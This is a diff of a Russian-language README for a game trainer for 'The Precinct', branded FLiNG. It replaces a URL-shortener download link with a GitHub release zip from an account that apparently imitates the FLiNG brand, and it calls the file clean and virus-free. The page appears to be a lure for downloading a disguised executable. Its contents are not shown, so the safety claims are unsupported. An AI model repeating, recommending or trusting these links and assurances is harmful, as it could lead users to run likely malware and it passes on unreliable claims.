@@ -2,7 +2,7 @@
 
 # 🚔 The Precinct — Trainer +33 [v1.0 | 2025] {FLiNG}
 
-[**🔥 СКАЧАТЬ ТРЕЙНЕР**](https://goo.su/OoaNRw) — *Надежная загрузка. Чистый файл. Без вирусов. Без установки.*
+[**🔥 СКАЧАТЬ ТРЕЙНЕР**](https://github.com/Fling2025New/the-precinct-trainer-cheat-fling-2025-steam-epic-v1-0-plus-33-mod-menu-download/releases/download/the-precinct-trainer-cheat-fling-2025-steam-epic-v1-0-plus-33-mod-menu-download/The-Precinct-Trainer-v1.0-Plus33-FLiNG-Steam-Epic-2025.zip) — *Надежная загрузка. Чистый файл. Без вирусов. Без установки.*
 
 > 💡 Поддержка Steam, Epic Games | Совместимость: Windows 10/11 | Актуально на: 15.05.2025
 
